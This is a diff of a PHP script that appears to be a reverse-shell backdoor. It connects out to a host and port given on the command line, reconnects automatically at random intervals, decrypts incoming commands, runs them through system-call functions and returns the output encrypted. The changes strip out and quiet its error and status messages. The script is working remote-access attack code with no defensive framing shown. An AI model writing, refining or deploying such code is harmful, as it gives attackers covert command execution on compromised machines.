@@ -4,48 +4,34 @@
 	ob_implicit_flush(1);
 	define("BUFFER_LEN", 4096);
 
-	$opts  = getopt("h:p:", ["host:", "port:"]);
+	$opts = getopt("h:p:", ["host:", "port:"]);
 	$opensslpath = './Openssl_EncryptDecrypt.php';
 
-	(count($opts) === 2) || die("Assign remote ip [-h/--host] and port [-p/--port]\n");
+	(count($opts) === 2) || die("assign remote ip [-h/--host] and port [-p/--port]\n");
 	$addr = array_key_exists("host", $opts) ? trim($opts['host']) : trim($opts['h']);
 	$port = array_key_exists("port", $opts) ? trim($opts['port']) : trim($opts['p']);
 
-	($socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP))
-		|| die("[\33[91m!\33[0m] socket_create() failed: reason: "
-				.socket_strerror(socket_last_error())."\n");
-
-	echo "Connecting to [".$addr.":".$port."]...\n";
-	($result = socket_connect($socket, $addr, $port))
-		|| die("[\33[91m!\33[0m] socket_connect failed: reason: "
-				.socket_strerror(socket_last_error($socket))."\n");
+	($socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) || die();
+	($result = socket_connect($socket, $addr, $port)) || die();
 
 	if(file_exists($opensslpath)){
 		require_once $opensslpath;
 		$openssl_encrypt_decrypt = new Openssl_EncryptDecrypt;
-	} else { die('error: openssl class is missing.'); }
+	} else { die(); }
 
-	echo "\33[32mConnected to host [".$addr.":".$port."]\33[0m\n";
+	echo "\33[32mconnected to host.\33[0m\n";
 	while(1)
 	{
 		// surpress "transport endpoint not connected" warning
 	    if(($recv = @socket_read($socket, BUFFER_LEN)) === false || $recv === "")
 	    {
 			socket_close($socket);
-	    	echo "[\33[91m!\33[0m] Empty stream.. Disconnected.\n";
+	    	echo "[\33[91m!\33[0m] empty stream.. disconnected.\n";
 			sleep(rand(1,5)); // try to reconnect => 1-5 sec interval
 
-    		if(($socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) === false){
-				echo "[\33[91m!\33[0m] socket_create() failed: reason: "
-					.socket_strerror(socket_last_error())."\n";
-			}
-
-			echo "Connecting to [".$addr.":".$port."]...\n";
-			if(($result = @socket_connect($socket, $addr, $port)) === false){
-				echo "[\33[91m!\33[0m] socket_connect failed: reason: "
-					.socket_strerror(socket_last_error($socket))."\n";
-			}
-			else { echo "\33[32mConnected to host [".$addr.":".$port."]\33[0m\n"; }
+    		$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+			$result = @socket_connect($socket, $addr, $port);
+			echo ($socket && $result) ? "\33[32mconnected to host.\33[0m\n" : '';
 		}
 	    else
 	    {
@@ -87,10 +73,10 @@
 					$result = @ob_get_contents(); 		
 					@ob_end_clean(); 
 				}
-				else { $result = "Error:: System calls disabled."; }
+				else { $result = "error:: system calls disabled."; }
 				$result .= "\n\rexecuted:: {$fnc}\n\rcmd:: {$full_cmd}";
 			}
-			else { $result = "Error:: decrypt().\n"; }
+			else { $result = "error:: decrypt().\n"; }
 			$result = $openssl_encrypt_decrypt->encrypt_cbc($result);
     		if(socket_write($socket, $result, strlen($result)) === false) {	continue; }
 	    }
